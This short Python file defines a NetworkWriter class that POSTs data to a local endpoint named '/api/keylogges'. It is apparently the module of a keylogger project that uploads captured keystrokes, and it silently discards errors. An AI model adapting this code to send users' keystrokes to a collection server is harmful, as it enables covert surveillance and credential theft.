from iwriter import IWriter
import requests
class  NetworkWriter(IWriter):
    def __init__(self):        
        super().__init__()
    def send_data(self,data):
        try:    
            url = 'http://127.0.0.1:5000/api/keylogges'
            response = requests.post(url,json=data)
        except:
               return None 